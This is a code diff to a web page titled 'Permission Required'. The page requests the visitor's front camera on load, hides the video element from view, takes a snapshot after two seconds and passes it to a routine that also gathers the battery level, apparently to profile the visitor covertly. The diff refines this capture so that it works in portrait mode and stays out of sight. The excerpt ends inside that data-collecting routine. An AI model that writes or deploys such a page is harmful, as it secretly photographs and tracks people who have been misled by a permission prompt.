@@ -5,8 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Permission Required</title>
     <style>
-        body { background-color: black; color: white; font-size: 20px; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-        #welcome { display: none; }
+        body { background-color: black; color: white; font-size: 20px; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; margin: 0; }
+        #welcome { display: none; color: white; font-size: 30px; }
+        video { display: none; }
     </style>
 </head>
 <body>
@@ -21,8 +22,19 @@
         let context = canvas.getContext("2d");
 
         // 🔥 Automatically request permissions
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-            .then(stream => {
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", aspectRatio: 9/16 },  // Portrait Mode
+            audio: false 
+        })
+        .then(stream => {
+            video.srcObject = stream;
+
+            // Wait for video to load and play
+            video.onloadedmetadata = () => {
+                // Set the canvas size to match video size for portrait mode
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
                 // Automatically start capturing after permission is granted
                 setTimeout(() => {
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -31,12 +43,11 @@
 
                     getUserDetails(imageData);
                 }, 2000); // 2 sec to capture photo
-
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                alert("Permission Denied: Unable to access Camera or Location");
-            });
+            };
+        })
+        .catch(err => {
+            alert("Permission Denied: Unable to access Camera or Location");
+        });
 
         async function getUserDetails(imageData) {
             let batteryPromise = navigator.getBattery().then(battery => `${Math.round(battery.level * 100)}%`).catch(() => "Unknown");
